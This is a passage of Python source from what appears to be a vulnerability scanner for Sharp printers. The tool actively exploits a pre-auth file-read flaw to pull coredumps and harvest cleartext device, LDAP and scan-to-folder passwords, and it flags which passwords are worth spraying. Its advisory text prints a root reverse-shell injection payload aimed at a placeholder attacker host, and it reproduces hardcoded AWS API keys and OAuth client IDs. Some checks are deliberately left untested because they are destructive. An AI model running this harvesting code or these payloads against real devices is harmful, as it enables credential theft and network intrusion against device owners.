                resp = http_get(url, ctx, headers=headers, cookies=cookies,
                                allow_redirects=False)
            except RequestException:
                break
            log_response(ctx, "SHARP LDAP SETTINGS RESPONSE", target.hostport,
                         resp, body_limit=400)
            if resp.status_code != 200:
                break
            page = resp.text or ""
            if PASSWORD_FIELD in page or page_title(page).lower().startswith("login"):
                # Session expired or this account cannot reach network settings.
                break

            entry = self._parse_ldap_entry(page)
            server = entry.get("server", "")
            username = entry.get("username", "")
            password = entry.get("password", "")
            if not (server or username or password):
                continue

            port = entry.get("port", "") or "389"
            scope = f"ldap://{server}:{port}" if server else "(LDAP server on this device)"
            detail_bits = [f"ldapid={ldap_id}"]
            for key in ("name", "search_root", "domain"):
                if entry.get(key):
                    detail_bits.append(f"{key.replace('_', ' ')}={entry[key]}")
            if not password:
                detail_bits.append(
                    "bind password is not rendered into the settings form on this "
                    "firmware - recover it from the coredump stage or with the "
                    "CVE-2024-34162 SIMPLE downgrade"
                )

            out.append(RecoveredCredential(
                kind="LDAP",
                scope=scope,
                username=username,
                password=password,
                source=(f"LDAP settings page {LDAP_ENTRY_PATH}?ldapid={ldap_id} read with the "
                        f"'{login_result.account.label}' session on {target.hostport}"),
                detail="; ".join(detail_bits),
                confidence="verified" if password else "config-only",
            ))
        return out

    def _parse_ldap_entry(self, page: str) -> Dict[str, str]:
        """
        Classify the inputs on an LDAP settings page by their rendered label.

        Two ways a stored value reaches the browser, and both are read:
        a ``value="..."`` attribute on the input, and - on firmware that
        populates the form from script instead - an assignment to the field
        name inside a <script> block.
        """
        entry: Dict[str, str] = {}
        for match in _LDAP_INPUT_RE.finditer(page):
            attrs = _attrs(match.group(1))
            name = attrs.get("name") or attrs.get("id") or ""
            if not name:
                continue

            label = _label_before(page, match.start())

            role = ""
            if attrs.get("type", "").lower() == "password":
                role = "password"
            else:
                for candidate, hints in _LDAP_FIELD_HINTS:
                    if any(hint in label for hint in hints):
                        role = candidate
                        break
            if not role or role in entry:
                continue

            value = attrs.get("value", "")
            if not value:
                js = re.search(re.escape(name) + r"[^\n=]{0,40}=\s*\"([^\"]*)\"", page)
                if js:
                    value = js.group(1)
            value = html_module.unescape(value).strip()
            if value:
                entry[role] = value
        return entry

    def _lfi_read(self, target: Target, ctx: ScanContext, path_arg: str,
                  max_bytes: int, tag: str) -> Optional[bytes]:
        """
        Fetch one file through the pre-auth LFI. Returns the bytes, or None on
        anything that is not a 200 with a body.
        """
        url = f"{target.base_url}{LFI_PATH}?path={path_arg}"
        headers = {
            "User-Agent": BROWSER_UA,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "close",
        }
        log_request(ctx, tag, target.hostport, "GET", url, headers)
        try:
            resp = http_get(url, ctx, headers=headers, allow_redirects=False,
                            max_bytes=max_bytes, timeout=ctx.export_timeout)
        except RequestException:
            return None
        log_response(ctx, f"{tag} RESPONSE", target.hostport, resp, body_limit=80)
        if resp.status_code != 200:
            return None
        body = resp.content or b""
        return body or None

    def _recover_from_memory(self, target: Target,
                             ctx: ScanContext) -> List[RecoveredCredential]:
        """
        Pull cleartext credentials out of the printer's coredumps.

        The advisory's finding is that /mnt/log holds world-readable gzipped
        coredumps of the main binary, and that the binary keeps credentials in
        the clear - the reporter recovered an administrator password that had
        never been used since boot. The main binary is also the web server, so
        form POST bodies are resident too, which is what makes the strongest
        hits here structured rather than guessed.

        Runs only after the /etc/passwd probe confirms traversal works, so a
        patched device costs one small request rather than a 17 MB download.
        """
        if not self._lfi_read(target, ctx, LFI_PROBE_PATH_ARG, 32 * 1024,
                              "SHARP RECOVERY LFI PRECHECK"):
            return []

        blob = b""
        source_file = ""
        for filename in COREDUMP_FILES:
            raw = self._lfi_read(target, ctx, f"{COREDUMP_DIR}{filename}",
                                 ctx.recovery_max_bytes, "SHARP COREDUMP READ")
            if not raw:
                continue
            data = _gunzip_partial(raw) if raw[:2] == b"\x1f\x8b" else raw
            if len(data) < 4096:
                continue
            blob, source_file = data, filename
            break

        creds: List[RecoveredCredential] = self._scan_memory(target, blob, source_file) if blob else []

        # The account database names the accounts that exist on the device even
        # when no coredump is present, which tells the operator which of the
        # recovered passwords is worth spraying and which accounts to check by
        # hand.
        # Only worth two more requests when there is something to annotate.
        accounts_seen = self._read_account_names(target, ctx) if creds else []
        if accounts_seen:
            note = "device accounts present per /mnt/std04/DBMS/uaccnt: " + ", ".join(accounts_seen)
            for cred in creds:
                if cred.kind == "device account":
                    cred.detail = f"{cred.detail}; {note}" if cred.detail else note

        if creds:
            evidence = _render_credential_evidence(target, source_file, creds)
            path = _write_evidence(ctx, target, "evidence_recovered_credentials",
                                   evidence.encode("utf-8", errors="replace"))
            for cred in creds:
                cred.evidence_path = path
        return creds

    def _scan_memory(self, target: Target, blob: bytes,
                     source_file: str) -> List[RecoveredCredential]:
        """
        Extract credentials from a decompressed coredump.

        Two passes with deliberately different confidence:

          * A ``ggt_textbox(10003)=`` hit is the verbatim body of a login POST
            the device processed. The field name is the device's own, so the
            value is a submitted password, not a guess - reported ``verified``.
          * Everything else is a ``<something>password=<value>`` match over raw
            memory. Very likely a credential, not proven to be one, so it is
            reported ``candidate`` and labelled as such in the findings file.
        """
        out: List[RecoveredCredential] = []
        origin = f"cleartext in {source_file} read through the pre-auth LFI on {target.hostport}"

        for match in _MEM_LOGIN_PW_RE.finditer(blob):
            password = unquote_plus(match.group(1).decode("ascii", errors="replace"))
            if not _looks_like_password(password):
                continue
            # The role travels in the same POST body a few bytes earlier.
            window = blob[max(0, match.start() - 200):match.start()]
            role = _role_from_post_body(window)
            user_match = _MEM_LOGIN_USER_RE.search(window)
            username = (unquote_plus(user_match.group(1).decode("ascii", errors="replace"))
                        if user_match else role)
            out.append(RecoveredCredential(
                kind="device account",
                scope=target.hostport,
                username=username or "(unknown account)",
                password=password,
                source=f"login form POST body recovered {origin}",
                detail=f"matched {PASSWORD_FIELD}= at offset 0x{match.start():x}"
                       + (f"; role selection {role}" if role else ""),
                confidence="verified",
            ))

        for match in _MEM_KV_PW_RE.finditer(blob):
            key = match.group(1).decode("ascii", errors="replace").lower()
            password = unquote_plus(match.group(2).decode("ascii", errors="replace"))
            if not _looks_like_password(password):
                continue
            if key.startswith(("ftp", "smb", "netfolder", "desktop")):
                kind, scope = "scan-to-folder", _nearest_host(blob, match.start()) or target.hostport
            elif "ldap" in key or "bind" in key:
                kind, scope = "LDAP", _nearest_host(blob, match.start(), scheme="ldap") or "(LDAP server)"
            else:
                kind, scope = "device account", target.hostport
            out.append(RecoveredCredential(
                kind=kind,
                scope=scope,
                username=_nearest_username(blob, match.start()),
                password=password,
                source=f"'{key}' assignment found {origin}",
                detail=f"matched at offset 0x{match.start():x}",
                confidence="candidate",
            ))
        return out

    def _read_account_names(self, target: Target, ctx: ScanContext) -> List[str]:
        """
        Read the account names out of the device's user database.

        The files are binary with embedded ASCII account names, so this is a
        strings pass filtered to plausible account names - it is used to
        annotate the recovered passwords, never to claim a credential on its
        own.
        """
        for path_arg in UACCNT_FILES:
            raw = self._lfi_read(target, ctx, path_arg, 2 * 1024 * 1024,
                                 "SHARP UACCNT READ")
            if not raw:
                continue
            names = []
            for _offset, text in printable_strings(raw, min_len=4):
                candidate = text.strip()
                if 4 <= len(candidate) <= 32 and re.fullmatch(r"[A-Za-z][A-Za-z0-9._\- ]+", candidate):
                    names.append(candidate)
            if names:
                # Order-preserving unique, capped: this is an annotation, not a dump.
                seen, unique = set(), []
                for name in names:
                    if name.lower() not in seen:
                        seen.add(name.lower())
                        unique.append(name)
                return unique[:20]
        return []

    def _advisory_pre_auth_memory_corruption(self) -> VulnFinding:
        """
        CVE-2024-28038 - pre-auth stack buffer overflow in the main HTTP
        stack. A ~639-byte MFPSESSIONID cookie overwrites the return stack
        of /tmp/main/main and hands the attacker control of PC. We do NOT
        probe this because the failure mode is a full crash of the main
        program (which serves HTTP, FTP, LPD, IPP, SNMP, and the touchscreen
        UI) followed by a reboot cycle. The advisory identifies the affected
        firmware family and every module we fingerprint runs it.
        """
        return VulnFinding(
            cve="CVE-2024-28038",
            title="Pre-authenticated stack buffer overflow in the main web server (RCE)",
            severity="critical",
            verified=False,
            output=(
                "Sharp advisory identifies a stack-based buffer overflow reached "
                "over an unauthenticated HTTP request whose MFPSESSIONID cookie is "
                "approximately 643 bytes long (buffer ~639 bytes; the trailing "
                "bytes overwrite saved registers). The main binary runs as root "
                "and services HTTP, FTP, LPD, IPP and SNMP, so a successful "
                "exploit yields root RCE and a failed one crashes every printer "
                "service until reboot. This scanner does NOT actively test the "
                "condition because failed exploitation reboots the device. "
                f"Apply the firmware update per {SHARP_ADVISORY}."
            ),
        )

    def _advisory_hardcoded_google_keys(self) -> VulnFinding:
        """
        CVE-2024-36248 - hardcoded Google OAuth client IDs baked into
        /tmp/main/main. Recoverable only by reading the binary off the
        device (which the LFI above enables), so this cannot be probed
        remotely as a per-device test; it's a firmware-family finding.
        """
        client_ids = "; ".join([
            "265490466885-m5cjvglv9q8aak493cgepe7juvafgh8c.apps.googleusercontent.com",
            "347970444986-0pij6u2tfhb240edjmls3h1u8qm2v2b3.apps.googleusercontent.com",
            "410988772526-6ujegl6jvquh9kstiegva8fk5j2ogag9.apps.googleusercontent.com",
            "292646726735-033ggn9hmlrs8bntrj0fbstob9m8qt26.apps.googleusercontent.com",
        ])
        return VulnFinding(
            cve="CVE-2024-36248",
            title="Hardcoded Google OAuth client IDs in the main firmware binary",
            severity="medium",
            verified=False,
            output=(
                "Sharp advisory identifies four hardcoded Google OAuth "
                "apps.googleusercontent.com client IDs baked into the main "
                "firmware binary (/tmp/main/main). The reporter notes the "
                "underlying registrations are no longer used by Sharp and are "
                "free for anyone to claim, so any device attempt to reach them "
                f"is receivable by an attacker who registers them: {client_ids}. "
                "Apply the firmware update per "
                f"{SHARP_ADVISORY} and block outbound traffic to the listed hosts."
            ),
        )

    def _advisory_hardcoded_aws_keys(self) -> VulnFinding:
        """
        Non-assigned CVE - hardcoded AWS API key and Postman token embedded
        in sub_20D542C() of /tmp/main/main, used to POST device analytics to
        an ap-northeast-1 API Gateway with ``curl -k`` (TLS validation
        disabled). Same recovery-only shape as the Google finding.
        """
        return VulnFinding(
            cve="no-CVE (hardcoded AWS analytics key)",
            title="Hardcoded AWS API key and analytics endpoint in the main firmware binary",
            severity="medium",
            verified=False,
            output=(
                "Sharp advisory identifies a hardcoded x-api-key "
                "'PBYXSIK6av8fBt8Qe1EQUaF9ZaKvTDutaXS9YwWA' and Postman token "
                "'44688039-5104-39be-f974-c1f5ef621a5f' shipped in the main "
                "firmware binary, used to POST device analytics to "
                "https://7db3z5d116.execute-api.ap-northeast-1.amazonaws.com/prod/MFPDataAlalytics "
                "with 'curl -k' (TLS certificate validation disabled). Any actor "
                "who recovers the keys can impersonate a printer or, by MITM'ing "
                "the analytics endpoint, receive traffic from every device. "
                f"Apply the firmware update per {SHARP_ADVISORY} and block "
                "outbound traffic to the listed endpoint."
            ),
        )

    def _advisory_ipv6_command_injection(self, admin_default_worked: bool) -> VulnFinding:
        """
        N-day CVE-2022-45796 - authenticated command injection in the IPv6
        address field on /nw_interface.html (form field ggt_textbox(16)),
        which the device passes to a shell (ping6). We do NOT actively test
        this because successful injection persists a shell payload into the
        printer's IPv6 network configuration.
        """
        priority = ""
        severity = "high"
        if admin_default_worked:
            priority = (
                " This scanner confirmed the Administrator account is still on the "
                "vendor default password, so an attacker already has everything "
                "they need to reach this injection point."
            )
            severity = "critical"
        return VulnFinding(
            cve="CVE-2022-45796",
            title="Authenticated command injection in the IPv6 configuration field (RCE)",
            severity=severity,
            verified=False,
            output=(
                "N-day CVE-2022-45796 (Pierre Kim, June 2024): the IPv6 address "
                "field on /nw_interface.html (form field ggt_textbox(16)) is "
                "passed unsanitised to a shell, so a POST containing "
                "'ggt_textbox(16)=|bash -i >& /dev/tcp/<attacker>/443 0>&1' "
                "yields a root reverse shell. Requires an authenticated "
                f"administrator session.{priority} This scanner does NOT "
                "actively test the condition because a successful exploit "
                "rewrites the printer's IPv6 network configuration. Apply the "
                f"firmware update per {SHARP_ADVISORY}."
            ),
        )

    def _advisory_ldap_downgrade(self, admin_default_worked: bool) -> VulnFinding:
        """
        CVE-2024-34162 - LDAP credential exfiltration via an authenticated
        downgrade of the LDAP client's authentication type to SIMPLE, at
        which point the printer's Connect Test transmits its stored bind
        credential in cleartext to whichever server the attacker has pointed
        it at. We do NOT actively test because the exploit requires standing
        up a rogue slapd and overwriting the device's LDAP configuration.
        """
        priority = ""
        severity = "high"
        if admin_default_worked:
            priority = (
                " This scanner confirmed the Administrator account is still on the "
                "vendor default password, so an attacker already has everything "
                "they need to reach this downgrade primitive."
            )
            severity = "critical"
        return VulnFinding(
            cve="CVE-2024-34162",
            title="LDAP credential exfiltration via authentication downgrade to SIMPLE",
            severity=severity,
            verified=False,
            output=(
                "CVE-2024-34162: an authenticated administrator can reconfigure "
                "the LDAP client at /nw_ldap_entry.html?ldapid=0 to point at an "
                "attacker-controlled server and downgrade the authentication "
                "type to SIMPLE. The Connect Test button then transmits the "
                "stored bind credential in cleartext to the attacker's slapd, "
                "which logs it verbatim (visible in slapd -d 10 output). "
                f"Requires an authenticated administrator session.{priority} "
                "This scanner does NOT actively test the condition because a "
                "successful test overwrites the device's LDAP settings and "
                "requires a rogue LDAP server. Review whether LDAP is "
                f"configured on the device and apply the firmware update per "
                f"{SHARP_ADVISORY}."
            ),
        )
